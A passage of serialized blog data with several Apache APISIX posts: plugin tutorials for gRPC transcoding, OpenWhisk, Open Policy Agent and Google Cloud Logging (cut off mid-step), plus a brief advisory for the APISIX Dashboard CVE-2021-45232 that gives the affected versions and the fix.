2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":4.02,"truncated":true,"authors":[{"name":"Bozhong Yu","title":"Author","url":"https://github.com/zaunist","image_url":"https://avatars.githubusercontent.com/u/38528079?v=4","imageURL":"https://avatars.githubusercontent.com/u/38528079?v=4"},{"name":"Sylvia","title":"Technical Writer","url":"https://github.com/SylviaBABY","image_url":"https://avatars.githubusercontent.com/u/39793568?v=4","imageURL":"https://avatars.githubusercontent.com/u/39793568?v=4"}],"prevItem":{"title":"Use APISIX and Authing to implement authentication","permalink":"/blog/2022/01/04/authing"},"nextItem":{"title":"Apache APISIX Dashboard Unauthorized Access Vulnerability Announcement (CVE-2021-45232)","permalink":"/blog/2021/12/28/dashboard-cve-2021-45232"}},"content":"> This article shows you how to proxy client HTTP traffic to the back-end gRPC service via the `grpc-transcode` plugin in Apache APISIX.\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\n### Apache APISIX\\n\\n[Apache APISIX](https://apisix.apache.org/) is a dynamic, real-time, high-performance API gateway that provides load balancing, dynamic upstream, canary release, service fusion, authentication, observability, and other rich traffic management features. Apache APISIX not only supports dynamic change and hot-plugging of plug-ins, but also has a rich library of plug-in resources.\\n\\n### gRPC\\n\\n[gRPC](https://grpc.io/) is an open source remote procedure call system initiated by Google. The system is based on HTTP/2 protocol transport, using Protocol Buffers as the interface description language, and can be run in any environment. The gRPC service provides pluggable mode support for load balancing, link tracing, health checking, and authentication, effectively connecting multiple services between data centers.\\n\\n## Plugin Introduction\\n\\nIn order to add support for gRPC service proxies, Apache APISIX has released `grpc-transcode`, a gRPC-based plugin that invokes gRPC services in a RESTful way.\\n\\nThe plugin supports specifying the contents of `.proto` files in Apache APISIX and implementing proxies for different gRPC services through user-defined gRPC services.\\n\\n### Integration Principle\\n\\nThe user specifies the `.proto` content in Apache APISIX, binds the corresponding proto by the `proto_id` in the `grpc-transcode` plugin, and configures the Service and Method defined in the `.proto` to implement a proxy for the gRPC service.\\n\\nThe basic principle is as follows: the user can configure a `grpc-transcode` plugin in the route, and when the route matches the request, it will forward the gRPC request to the upstream service.\\n\\n:::note\\nThe `grpc-transcode` plugin supports configuration of `proto_id`, `grpc service name`, `grpc service method`, `grpc deadline`, and `pb_option`. Based on the configuration, the upstream gRPC service is invoked and the response obtained from the upstream gRPC service is returned to the client.\\n:::\\n\\n## How to use\\n\\n### Environment Preparation\\n\\nBefore configuring Apache APISIX, you need to start the gRPC service.\\n\\n#### Step 1: Configure the grpc-server-example service\\n\\n1. Clone the `grpc-server-example` repository.\\n\\n```shell\\ngit clone https://github.com/api7/grpc_server_example\\n```\\n\\n2. Start grpc-server.\\n\\n```shell\\ncd grpc_server_example\\ngo run main.go\\n```\\n\\n3. Verify the gRPC service, it is recommended to use `grpcurl` to verify the availability of the service.\\n\\n```shell\\ngrpcurl -d \'{\\"name\\": \\"zhangsan\\"}\' -plaintext 127.0.0.1:50051 helloworld.Greeter.SayHello\\n```\\n\\nAfter correctly starting the gRPC service, executing the above command will output the following.\\n\\n```json\\n{\\n \\"message\\": \\"Hello zhangsan\\"\\n}\\n```\\n\\n#### Step 2: Configure Apache APISIX\\n\\n1. Add proto\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/proto/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"content\\" : \\"syntax = \\\\\\"proto3\\\\\\";\\n    package helloworld;\\n    service Greeter {\\n        rpc SayHello (HelloRequest) returns (HelloReply) {}\\n    }\\n    message HelloRequest {\\n        string name = 1;\\n    }\\n    message HelloReply {\\n        string message = 1;\\n    }\\"\\n}\'\\n```\\n\\n2. In the specified Route, proxy the gRPC service interface.\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"methods\\": [\\"GET\\"],\\n    \\"uri\\": \\"/grpctest\\",\\n    \\"plugins\\": {\\n        \\"grpc-transcode\\": {\\n         \\"proto_id\\": \\"1\\",\\n         \\"service\\": \\"helloworld.Greeter\\",\\n         \\"method\\": \\"SayHello\\"\\n        }\\n    },\\n    \\"upstream\\": {\\n        \\"scheme\\": \\"grpc\\",\\n        \\"type\\": \\"roundrobin\\",\\n        \\"nodes\\": {\\n            \\"127.0.0.1:50051\\": 1\\n        }\\n    }\\n}\'\\n```\\n\\nDetails of the specific code interpretation and supported parameters can be found below.\\n\\n| Name      | Type                        | Requirement | Default | Description                       |\\n|:----------|:-----------------------------|:------|:-------|:---------------------------|\\n| proto_id  | string/integer               | required | N/A  | `.proto` content id        |\\n| service   | string                       | required | N/A  | the grpc service name                |\\n| method    | string                       | required | N/A  | the method name of grpc service  |\\n| deadline  | number                       | optional | 0    | deadline for grpc in milliseconds          |\\n| pb_option | array[string(pb_option_def)] | optional | N/A  | protobuf options |\\n\\n### Testing Requests\\n\\nHere we will use cURL for testing.\\n\\n```shell\\ncurl -i http://127.0.0.1:9080/grpctest\\\\?name=world\\nHTTP/1.1 200 OK\\nDate: Mon, 27 Dec 2021 06:24:47 GMT\\nContent-Type: application/json\\nTransfer-Encoding: chunked\\nConnection: keep-alive\\nServer: APISIX/2.11.0\\nTrailer: grpc-status\\nTrailer: grpc-message\\n\\n{\\"message\\":\\"Hello world\\"}\\ngrpc-status: 0\\ngrpc-message:\\n```\\n\\nThe feedback from the code shows that the request was successfully proxied to the back-end gRPC service.\\n\\n### Disabling the plugin\\n\\nIf you are done using the `grpc-transcode` plugin on the route, simply remove the plugin-related configuration from the route configuration to turn off the `grpc-transcode` plugin on the route.\\n\\nThanks to the Apache APISIX plugin hot-loading mode, there is no need to restart Apache APISIX to turn it on and off.\\n\\n```shell\\n# Disable the plugin\\ncurl http://127.0.0.1:9080/apisix/admin/routes/111 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"methods\\": [\\"GET\\"],\\n    \\"uri\\": \\"/grpctest\\",\\n    \\"plugins\\": {},\\n    \\"upstream\\": {\\n        \\"scheme\\": \\"grpc\\",\\n        \\"type\\": \\"roundrobin\\",\\n        \\"nodes\\": {\\n            \\"127.0.0.1:50051\\": 1\\n        }\\n    }\\n}\'\\n```\\n\\n## Summary\\n\\nThis article provides a step-by-step guide to using the `grpc-transcode` plugin to proxy requests to a back-end gRPC service via RESTful. By using this plugin, Apache APISIX can be configured to proxy to the gRPC service only.\\n\\nFor more descriptions and a complete configuration list of the grpc-transcode plugin, please refer to the [official documentation](https://apisix.apache.org/docs/apisix/next/plugins/grpc-transcode/)."},{"id":"Apache APISIX Dashboard Unauthorized Access Vulnerability Announcement (CVE-2021-45232)","metadata":{"permalink":"/blog/2021/12/28/dashboard-cve-2021-45232","source":"@site/blog/2021/12/28/dashboard-cve-2021-45232.md","title":"Apache APISIX Dashboard Unauthorized Access Vulnerability Announcement (CVE-2021-45232)","description":"There is a security vulnerability of unauthorized access in Apache APISIX Dashboard 2.7-2.10, and the processing information will be announced.","date":"2021-12-28T00:00:00.000Z","formattedDate":"December 28, 2021","tags":[{"label":"Vulnerabilities","permalink":"/blog/tags/vulnerabilities"}],"readingTime":0.845,"truncated":true,"authors":[{"name":"Yucheng Zhu","url":"https://github.com/f11t3rStAr","imageURL":"https://avatars.githubusercontent.com/u/71011664?v=4"}],"prevItem":{"title":"Use API gateway to proxy gRPC service","permalink":"/blog/2021/12/30/apisix-proxy-grpc-service"},"nextItem":{"title":"Coming soon! Apache APISIX Integrate with Apache OpenWhisk","permalink":"/blog/2021/12/24/apisix-integrate-openwhisk-plugin"}},"content":"> There is a security vulnerability of unauthorized access in Apache APISIX Dashboard 2.7-2.10, and the processing information will be announced.\\n\\n\x3c!--truncate--\x3e\\n\\n## Problem description\\n\\nAttackers can access certain interfaces without logging in to Apache APISIX Dashboard, thus making unauthorized changes or obtaining relevant configuration information such as Apache APISIX Route, Upstream, Service, etc., and cause problems such as SSRF, malicious traffic proxies built by attackers, and arbitrary code execution.\\n\\n## Affected Versions\\n\\nApache APISIX Dashboard versions 2.7 - 2.10\\n\\n## Solution\\n\\nPlease update to Apache APISIX Dashboard version 2.10.1 and above.\\n\\n## Security Recommendations\\n\\nIt is recommended that users change their default user name and password in a timely manner and restrict source IP access to the Apache APISIX Dashboard.\\n\\n## Vulnerability details\\n\\nVulnerability public date: December 27, 2021\\n\\nCVE details: https://nvd.nist.gov/vuln/detail/CVE-2021-45232\\n\\n## Contributor Profile\\n\\nThis vulnerability was discovered by Yucheng Zhu of the Security Team at Yuanbao Technology and reported to the Apache Software Foundation. Thank you for your contributions to the Apache APISIX community.\\n\\n![Yuanbao Technology](https://static.apiseven.com/202108/1640324848257-4978eaac-bfd7-4265-82d2-9c024956b933.png)"},{"id":"Coming soon! Apache APISIX Integrate with Apache OpenWhisk","metadata":{"permalink":"/blog/2021/12/24/apisix-integrate-openwhisk-plugin","source":"@site/blog/2021/12/24/apisix-integrate-openwhisk-plugin.md","title":"Coming soon! Apache APISIX Integrate with Apache OpenWhisk","description":"The `openwhisk` plugin is combined with the API Gateway Apache APISIX authentication plugin to achieve authentication and authorization functions.","date":"2021-12-24T00:00:00.000Z","formattedDate":"December 24, 2021","tags":[{"label":"Plugins","permalink":"/blog/tags/plugins"},{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":4.21,"truncated":true,"authors":[{"name":"Zeping Bai","title":"Author","url":"https://github.com/bzp2010","image_url":"https://avatars.githubusercontent.com/u/8078418?v=4","imageURL":"https://avatars.githubusercontent.com/u/8078418?v=4"},{"name":"Sylvia","title":"Technical Writer","url":"https://github.com/SylviaBABY","image_url":"https://avatars.githubusercontent.com/u/39793568?v=4","imageURL":"https://avatars.githubusercontent.com/u/39793568?v=4"}],"prevItem":{"title":"Apache APISIX Dashboard Unauthorized Access Vulnerability Announcement (CVE-2021-45232)","permalink":"/blog/2021/12/28/dashboard-cve-2021-45232"},"nextItem":{"title":"Apache APISIX integrates with Open Policy Agent","permalink":"/blog/2021/12/24/open-policy-agent"}},"content":"> This article introduces the feature prospect and usage steps of the `openwhisk` plug-in, which is combined with a variety of identity authentication plug-ins provided by Apache APISIX to achieve authentication and authorization and other functions.\\n\\n\x3c!--truncate--\x3e\\n\\nIn this article, we will introduce `openwhisk`, a new plug-in for Apache APISIX, and show you how to integrate OpenWhisk service with Apache APISIX to enjoy the benefits of serverless computing with detailed steps. This plugin is expected to go live in Apache APISIX 2.12, so stay tuned!\\n\\n![APISIX&OpenWhisk](https://static.apiseven.com/202108/1640313816872-b2c018be-5433-4baf-ba6a-8330e160866a.png)\\n\\n## Project Introduction\\n\\n### Apache APISIX\\n\\n[Apache APISIX](https://apisix.apache.org/) is a dynamic, real-time, high-performance API gateway that provides rich traffic management features such as load balancing, dynamic upstream, canary release, service fusion, authentication, observability, etc. Apache APISIX not only supports plug-in dynamic changes and hot-plugging, but also has many useful plug-ins.\\n\\n### Apache OpenWhisk\\n\\n[Apache OpenWhisk](https://openwhisk.apache.org/) is an open source distributed serverless platform that can respond to any scale of time by executing functions. It uses Docker containers to manage infrastructure, servers, and scale to help users build great and efficient applications.\\n\\nIn OpenWhisk developers can use multiple programming languages to write functions (called Actions) that will be dynamically dispatched and processed by OpenWhisk in response to events (via triggers) or external requests (via HTTP requests).\\n\\n## Integration Principle\\n\\nApache APISIX provides plug-in support for easy integration with Apache OpenWhisk. Users can define a route that includes a serverless plug-in and combine it with various authentication plug-ins provided by Apache APISIX to implement authentication and authorization functions.\\n\\nThe general principle of operation is as follows: users can use the openwhisk plugin to define a \\"dynamic upstream\\" in the route, and when the route matches a request, it will abort the request to the original upstream and send a request to the API Host endpoint of OpenWhisk.\\n\\n> The request will contain the Namespace, Action, Service Token and raw HTTP request body data configured by the user for the plugin, and will return the response content obtained from OpenWhisk to the client.\\n\\n## How to use\\n\\n### Step 1: Set up Apache OpenWhisk test environment\\n\\n1. First, you need to ensure that you are using a Linux system with Docker software installed on it. Execute the following command.\\n\\n```shell\\ndocker run --rm -d \\\\\\n  -h openwhisk --name openwhisk \\\\\\n  -p 3233:3233 -p 3232:3232 \\\\\\n  -v /var/run/docker.sock:/var/run/docker.sock \\\\\\n  openwhisk/standalone:nightly\\n\\ndocker exec openwhisk waitready\\n```\\n\\n2. Wait for the command execution to complete and the following will be output.\\n\\n```\\nok: whisk auth set. Run \'wsk property get --auth\' to see the new value.\\nok: whisk API host set to http://openwhisk:3233\\nok: updated action testme\\nserver initializing...\\nserver initializing...\\n    \\"ready\\": true\\nok: deleted action testme\\n```\\n\\n3. Create the following file `test.js` to be used as a test function.\\n\\n```java\\nfunction main(args) {\\n    return {\\n        \\"hello\\": args.name || \\"\\",\\n    };\\n}\\n```\\n\\n4. Register the above functions in OpenWhisk\\n\\n```shell\\n# Set API Host and authentication information for the OpenWhisk CLI tool\uff0cyou can download from https://s.apache.org/openwhisk-cli-download\\nwsk property set \\\\\\n  --apihost \'http://localhost:3233\' \\\\\\n  --auth \'23bc46b1-71f6-4ed5-8c54-816aa4f8c502:123zO3xZCLrMN6v2BKK1dXYFpXlPkccOFqm12CdAsMgRU4VrNZ9lyGVCGuMDGIwP\'\\n\\n# Create a test function\\nwsk action create test test.js\\n```\\n\\n### Step 2: Create a route and enable OpenWhisk plugin\\n\\nNext we will create a route and add the openwhisk plugin to it. Execute the following command.\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"plugins\\": {\\n        \\"openwhisk\\": {\\n            \\"api_host\\": \\"http://localhost:3233\\",\\n            \\"service_token\\": \\"23bc46b1-71f6-4ed5-8c54-816aa4f8c502:123zO3xZCLrMN6v2BKK1dXYFpXlPkccOFqm12CdAsMgRU4VrNZ9lyGVCGuMDGIwP\\",\\n            \\"namespace\\": \\"guest\\",\\n            \\"action\\": \\"test\\"\\n        }\\n    },\\n    \\"uri\\": \\"/openwhisk\\"\\n}\'\\n```\\n\\n### Step 3: Testing the request\\n\\nIn the following we will use cURL for testing.\\n\\n```shell\\n# Request and send data using POST\\ncurl http://127.0.0.1:9080/openwhisk -i -X POST -d \'{\\n    \\"name\\": \\"world\\"\\n}\'\\n\\nHTTP/1.1 200 OK\\nContent-Type: application/json\\nContent-Length: 17\\nServer: APISIX/2.10.2\\n\\n{\\"hello\\":\\"world\\"}\\n\\n# Request using GET\\ncurl http://127.0.0.1:9080/openwhisk -i\\n\\nHTTP/1.1 200 OK\\nContent-Type: application/json\\nContent-Length: 12\\nServer: APISIX/2.10.2\\n\\n{\\"hello\\":\\"\\"}\\n```\\n\\n### Step 4: Test complex responses\\n\\n1. Create and update the `test.js` test function\\n\\n```java\\nfunction main(args) {\\n    return {\\n        \\"status\\": \\"403\\",\\n        \\"headers\\": {\\n            \\"test\\": \\"header\\"\\n        },\\n        \\"body\\": \\"A test body\\"\\n    };\\n}\\n```\\n\\n2. Conducting test requests\\n\\n```shell\\n# Request using GET\\ncurl http://127.0.0.1:9080/openwhisk -i\\n\\nHTTP/1.1 403 FORBIDDEN\\nContent-Type: application/json\\nContent-Length: 12\\ntest: header\\nServer: APISIX/2.10.2\\n\\nA test body\\n```\\n\\n### Addendum: Turning off the plugin\\n\\nIf you are done using the OpenWhisk plug-in, simply remove the OpenWhisk-related configuration from the route configuration and save it to close the OpenWhisk plug-in on the route. At this point you can open other Serverless-like plug-ins or add upstream and other subsequent operations.\\n\\nThanks to the dynamic advantage of Apache APISIX, the process of turning on and off plug-ins does not require restarting Apache APISIX, which is very convenient.\\n\\n## Summary\\n\\nIn this article, we have introduced the feature preview and usage steps of `openwhisk` plugin. For more information about `openwhisk` plugin description and full configuration list, please refer to the [official documentation](https://apisix.apache.org/docs/apisix/next/plugins/openwhisk).\\n\\nCurrently, we are also developing other Serverless plugins to integrate with more cloud services. If you\'re interested in such integration projects, feel free to start a discussion in [GitHub Discussions](https://github.com/apache/apisix/discussions) or communicate via the [mailing list](https://apisix.apache.org/docs/general/join/)."},{"id":"Apache APISIX integrates with Open Policy Agent","metadata":{"permalink":"/blog/2021/12/24/open-policy-agent","source":"@site/blog/2021/12/24/open-policy-agent.md","title":"Apache APISIX integrates with Open Policy Agent","description":"This article takes HTTP API as an example to introduce the `opa` plugin, and explains in detail how to integrate the API gateway Apache APISIX with OPA.","date":"2021-12-24T00:00:00.000Z","formattedDate":"December 24, 2021","tags":[{"label":"Plugins","permalink":"/blog/tags/plugins"},{"label":"Authentication","permalink":"/blog/tags/authentication"}],"readingTime":4.615,"truncated":true,"authors":[{"name":"Zeping Bai","title":"Author","url":"https://github.com/bzp2010","image_url":"https://avatars.githubusercontent.com/u/8078418?v=4","imageURL":"https://avatars.githubusercontent.com/u/8078418?v=4"},{"name":"Yilin Zeng","title":"Technical Writer","url":"https://github.com/yzeng25","image_url":"https://avatars.githubusercontent.com/u/36651058?v=4","imageURL":"https://avatars.githubusercontent.com/u/36651058?v=4"}],"prevItem":{"title":"Coming soon! Apache APISIX Integrate with Apache OpenWhisk","permalink":"/blog/2021/12/24/apisix-integrate-openwhisk-plugin"},"nextItem":{"title":"APISIX Integrates with Google Cloud Logging","permalink":"/blog/2021/12/22/google-logging"}},"content":"> This article introduces the `opa` plug-in as an example of HTTP API and details how to integrate Apache APISIX with OPA to decouple the authentication authorization of back-end services.\\n\\n\x3c!--truncate--\x3e\\n\\n![APISIX-OPA cover](https://static.apiseven.com/202108/1640333490845-38542a3e-5d3a-4960-b11f-69ce3a61f7fc.png)\\n\\nOpen Policy Agent (OPA) is an open source lightweight general-purpose policy engine that can replace the built-in policy function module in software and help users decouple services from the policy engine. Thanks to [OPA\'s well-established ecosystem](https://www.openpolicyagent.org/docs/latest/ecosystem/), users can easily integrate OPA with other services, such as program libraries, HTTP APIs, etc.\\n\\nAs shown in the figure below, OPA first describes the policy through the policy language Rego; then stores the policy data through JSON, after which the user can send a query request. After receiving the query request, OPA will combine the policy, data and user input to generate a policy decision and send the decision to the service.\\n\\n![OPA Workflow](https://static.apiseven.com/202108/1640332208554-40f574e3-0582-48f3-8e07-eb49fbd37ac7.png)\\n\\n## Plugin Introduction\\n\\nApache APISIX provides an `opa` plug-in that allows users to conveniently introduce the policy capabilities provided by OPA to Apache APISIX to enable flexible authentication and access control features.\\n\\nAfter configuring the `opa` plug-in on a route, Apache APISIX assembles request information, connection information, etc. into JSON data and sends it to the policy decision API address when processing response requests. As long as the policy deployed in OPA conforms to the data specification set by Apache APISIX, functions such as pass request, reject request, custom status code, custom response header, custom response header, etc. can be implemented.\\n\\nThis article takes HTTP API as an example to introduce the `opa` plug-in and details how to integrate Apache APISIX with OPA to decouple authentication authorization for back-end services.\\n\\n## How to use\\n\\n### Build test environment\\n\\n1. Use Docker to build OPA services.\\n\\n   ```shell\\n   # Running OPA with Docker\\n   docker run -d --name opa -p 8181:8181 openpolicyagent/opa:0.35.0 run -s\\n    ```\\n\\n2. Create an `example` policy.\\n\\n    ```shell\\n    # Create policy\\n    curl -XPUT \'localhost:8181/v1/policies/example\' \\\\\\n    --header \'Content-Type: text/plain\' \\\\\\n    --data-raw \'package example\\n\\n    import input.request\\n    import data.users\\n\\n    default allow = false\\n\\n    allow {\\n        # has the name test-header with the value only-for-test request header\\n        request.headers[\\"test-header\\"] == \\"only-for-test\\"\\n        # The request method is GET\\n        request.method == \\"GET\\"\\n        # The request path starts with /get\\n        startswith(request.path, \\"/get\\")\\n        # GET parameter test exists and is not equal to abcd\\n        request.query[\\"test\\"] != \\"abcd\\"\\n        # GET parameter user exists\\n        request.query[\\"user\\"]\\n    }\\n\\n    reason = users[request.query[\\"user\\"]].reason {\\n        not allow\\n        request.query[\\"user\\"]\\n    }\\n\\n    headers = users[request.query[\\"user\\"]].headers {\\n        not allow\\n        request.query[\\"user\\"]\\n    }\\n\\n    status_code = users[request.query[\\"user\\"]].status_code {\\n        not allow\\n        request.query[\\"user\\"]\\n    }\'\\n    ```\\n\\n3. Create `users` data.\\n\\n    ```shell\\n    # Create test user data\\n    curl -XPUT \'localhost:8181/v1/data/users\' \\\\\\n    --header \'Content-Type: application/json\' \\\\\\n    --data-raw \'{\\n        \\"alice\\": {\\n            \\"headers\\": {\\n                \\"Location\\": \\"http://example.com/auth\\"\\n            },\\n            \\"status_code\\": 302\\n        },\\n        \\"bob\\": {\\n            \\"headers\\": {\\n                \\"test\\": \\"abcd\\",\\n                \\"abce\\": \\"test\\"\\n            }\\n        },\\n        \\"carla\\": {\\n            \\"reason\\": \\"Give you a string reason\\"\\n        },\\n        \\"dylon\\": {\\n            \\"headers\\": {\\n                \\"Content-Type\\": \\"application/json\\"\\n            },\\n            \\"reason\\": {\\n                \\"code\\": 40001,\\n                \\"desc\\": \\"Give you a object reason\\"\\n            }\\n        }\\n    }\'\\n    ```\\n\\n### Create a route and enable the plugin\\n\\nRun the following command to create the route and enable the `opa` plugin.\\n\\n```shell\\ncurl -XPUT \'http://127.0.0.1:9080/apisix/admin/routes/r1\' \\\\\\n--header \'X-API-KEY: <api-key>\' \\\\\\n--header \'Content-Type: application/json\' \\\\\\n--data-raw \'{\\n    \\"uri\\": \\"/*\\",\\n    \\"methods\\": [\\n        \\"GET\\",\\n        \\"POST\\",\\n        \\"PUT\\",\\n        \\"DELETE\\"\\n    ],\\n    \\"plugins\\": {\\n        \\"opa\\": {\\n            \\"host\\": \\"http://127.0.0.1:8181\\",\\n            \\"policy\\": \\"example\\"\\n        }\\n    },\\n    \\"upstream\\": {\\n        \\"nodes\\": {\\n            \\"httpbin.org:80\\": 1\\n        },\\n        \\"type\\": \\"roundrobin\\"\\n    }\\n}\'\\n```\\n\\n### Test Requests\\n\\nNext, run the following command to send a request to the `opa` plugin to test the plugin\'s running status.\\n\\n```shell\\n# Allow requests\\ncurl -XGET \'127.0.0.1:9080/get?test=none&user=dylon\' \\\\\\n    --header \'test-header: only-for-test\'\\n{\\n    \\"args\\": {\\n        \\"test\\": \\"abcd1\\",\\n        \\"user\\": \\"dylon\\"\\n    },\\n    \\"headers\\": {\\n        \\"Test-Header\\": \\"only-for-test\\",\\n        \\"with\\": \\"more\\"\\n    },\\n    \\"origin\\": \\"127.0.0.1\\",\\n    \\"url\\": \\"http://127.0.0.1/get?test=abcd1&user=dylon\\"\\n}\\n\\n# Reject the request and rewrite the status code and response headers\\ncurl -XGET \'127.0.0.1:9080/get?test=abcd&user=alice\' \\\\\\n    --header \'test-header: only-for-test\'\\n\\nHTTP/1.1 302 Moved Temporarily\\nDate: Mon, 20 Dec 2021 09:37:35 GMT\\nContent-Type: text/html\\nContent-Length: 142\\nConnection: keep-alive\\nLocation: http://example.com/auth\\nServer: APISIX/2.11.0\\n\\n# Rejects the request and returns a custom response header\\ncurl -XGET \'127.0.0.1:9080/get?test=abcd&user=bob\' \\\\\\n    --header \'test-header: only-for-test\'\\n\\nHTTP/1.1 403 Forbidden\\nDate: Mon, 20 Dec 2021 09:38:27 GMT\\nContent-Type: text/html; charset=utf-8\\nContent-Length: 150\\nConnection: keep-alive\\nabce: test\\ntest: abcd\\nServer: APISIX/2.11.0\\n\\n# Rejects the request and returns a custom response (string)\\ncurl -XGET \'127.0.0.1:9080/get?test=abcd&user=carla\' \\\\\\n    --header \'test-header: only-for-test\'\\n\\nHTTP/1.1 403 Forbidden\\nDate: Mon, 20 Dec 2021 09:38:58 GMT\\nContent-Type: text/plain; charset=utf-8\\nTransfer-Encoding: chunked\\nConnection: keep-alive\\nServer: APISIX/2.11.0\\n\\nGive you a string reason\\n\\n# Rejects the request and returns a custom response (JSON)\\ncurl -XGET \'127.0.0.1:9080/get?test=abcd&user=dylon\' \\\\\\n    --header \'test-header: only-for-test\'\\n\\nHTTP/1.1 403 Forbidden\\nDate: Mon, 20 Dec 2021 09:42:12 GMT\\nContent-Type: application/json\\nTransfer-Encoding: chunked\\nConnection: keep-alive\\nServer: APISIX/2.11.0\\n\\n{\\"code\\":40001,\\"desc\\":\\"Give you a object reason\\"}\\n```\\n\\n### Disable the plugin\\n\\nThanks to the dynamic nature of Apache APISIX, the OPA plug-in on a route can be turned off by simply removing the `opa` plug-in related configuration from the route configuration and saving it.\\n\\n## Summary\\n\\nThis article describes the detailed steps for interfacing Apache APISIX and Open Policy Agent. We hope this article will give you a clearer understanding of using Open Policy Agent in Apache APISIX and facilitate the subsequent hands-on operation.\\n\\nApache APISIX is not only committed to maintaining its own high performance, but also has always attached great importance to the construction of open source ecology. At present, Apache APISIX has 10+ authentication authorization-related plug-ins that support interfacing with mainstream authentication authorization services in the industry.\\n\\nIf you have the need to interface with other authentication authorities, visit Apache APISIX\'s [GitHub](https://github.com/apache/apisix/issues) and leave your suggestions via issue; or subscribe to Apache APISIX\'s [mailing list](https://apisix.apache.org/zh/docs/general/join) to express your ideas via email."},{"id":"APISIX Integrates with Google Cloud Logging","metadata":{"permalink":"/blog/2021/12/22/google-logging","source":"@site/blog/2021/12/22/google-logging.md","title":"APISIX Integrates with Google Cloud Logging","description":"This article describes how to interface with the Google Cloud Logging service through the google-cloud-logging plugin of API Gateway Apache APISIX.","date":"2021-12-22T00:00:00.000Z","formattedDate":"December 22, 2021","tags":[{"label":"Plugins","permalink":"/blog/tags/plugins"},{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":6.64,"truncated":true,"authors":[{"name":"Jinchao Shuai","title":"Author","url":"https://github.com/shuaijinchao","image_url":"https://avatars.githubusercontent.com/u/8529452?v=4","imageURL":"https://avatars.githubusercontent.com/u/8529452?v=4"},{"name":"Yilin Zeng","title":"Technical Writer","url":"https://github.com/yzeng25","image_url":"https://avatars.githubusercontent.com/u/36651058?v=4","imageURL":"https://avatars.githubusercontent.com/u/36651058?v=4"}],"prevItem":{"title":"Apache APISIX integrates with Open Policy Agent","permalink":"/blog/2021/12/24/open-policy-agent"},"nextItem":{"title":"Biweekly Report (Dec 1 - Dec 15)","permalink":"/blog/2021/12/20/weekly-report-1215"}},"content":"> This article will explain how to configure and use the Google Cloud Logging service in Apache APISIX.\\n\\n\x3c!--truncate--\x3e\\n\\n![Apache APISIX-Google Cloud Logging cover](https://static.apiseven.com/202108/1640155567091-2611f8b8-8181-42d8-8756-e892b3768a8d.png)\\n\\nLogging is an important infrastructure for distributed systems. It can help developers observe the status of service operation, improve the efficiency of service troubleshooting and diagnosis, and conduct multi-dimensional analysis to improve the overall stability and operational efficiency of the system.\\n\\n[Google Cloud Logging](https://cloud.google.com/logging/) is a real-time log management service provided by Google Cloud, offering EB-level storage, search, analysis, and alerting services. Google Cloud Logging\'s log browser allows you to search, sort, and analyze logs easily and efficiently, and Google Cloud Logging also provides saved queries and rich graphical features to make log screening results retrievable and more intuitive.\\n\\nApache APISIX has previously supported the integration of [HTTP Logger](https://github.com/apache/apisix/blob/master/docs/en/latest/plugins/http-logger.md) , [TCP Logger](https://github.com/apache/apisix/blob/master/docs/en/latest/plugins/tcp-logger.md), [Kafka Logger](https://github.com/apache/apisix/blob/master/docs/en/latest/plugins/kafka-logger.md), [UDP Logger](https://github.com/apache/apisix/blob/master/docs/en/latest/plugins/udp-logger.md), [RocketMQ Logger](https://github.com/apache/apisix/blob/master/docs/en/latest/plugins/rocketmq-logger.md), [SkyWalking Logger](https://github.com/apache/apisix/blob/master/docs/en/latest/plugins/skywalking-logger.md), [Aliyun Cloud Logging(SLS)](https://github.com/apache/apisix/blob/master/docs/en/latest/plugins/sls-logger.md) and many other open source and cloud logging service solutions.\\n\\nRecently, Apache APISIX has also added support for Google Cloud Logging, giving users a new logging solution when using Apache APISIX as a gateway: use [google-cloud-logging](https://github.com/apache/apisix/blob/master/docs/en/latest/plugins/google-cloud-logging.md) to forward Apache APISIX request logs to the Google Cloud Logging service for analysis and storage.\\n\\nWhen the plugin is enabled, Apache APISIX will take the request context information in Log Phase and serialize it into Google Cloud Logging\'s [LogEntry](https://cloud.google.com/logging/docs/reference/v2/rest/v2/LogEntry), then submit the serialized log data to the batch queue, and when the batch queue triggers a user-set time or entry threshold, the log data will be forwarded to Google Cloud Logging service via Google Cloud API to the Google Cloud Logging service.\\n\\nThis article will explain how to configure and use the Google Cloud Logging service in Apache APISIX.\\n\\n## Configure Google Cloud\\n\\n1. Open your browser and visit Google Cloud Homepage.\\n2. Enter your username and password to log in to the Google Cloud console.\\n3. Click the Google Cloud console left menu and select \\"IAM & Admin > Create a Project\\" to start creating a project.\\n   ![create a project](https://static.apiseven.com/202108/1640137078950-3a0b472b-df9f-4f75-9c03-816138860f74.png)\\n4. Enter a project name, select an organization name, and click \\"CREATE\\" to create the project.\\n   ![create a project-2](https://static.apiseven.com/202108/1640137136967-effec599-2263-45e7-874d-53a547b83aae.png)\\n5. When the project is created successfully, the top right corner of the console indicates that the creation was successful.\\n   ![project notification](https://static.apiseven.com/202108/1640137177601-6ac703ef-99e4-4ac2-82e3-5b978348f458.png)\\n6. Click in the window to select the project, or select the project operation path in the top navigation bar of the console home page. After selecting the project, you will be redirected to the console home page, where you can already see the data about the current project in the top navigation bar and the project information in the information center.\\n   ![view your project](https://static.apiseven.com/202108/1640137215687-4a2a4789-09d3-4cc0-85fa-be67762cf9b7.png)\\n7. After you finish creating the project, you need to create a service account for the project. Please go back to the Google Cloud console home page and click \\"IAM & Admin > Service Account\\" on the left menu to start creating a service account.\\n   ![start creating a service account](https://static.apiseven.com/202108/1640137733012-6c9808c8-9c96-401e-a680-03a276b964c0.png)\\n8. Click \\"CREATE SERVICE ACCOUNT\\" to create the service account.\\n   ![create a service account](https://static.apiseven.com/202108/1640137784375-e47cbe0e-7735-4e7b-a881-1a9ec1c12ffc.png)\\n9. Enter the 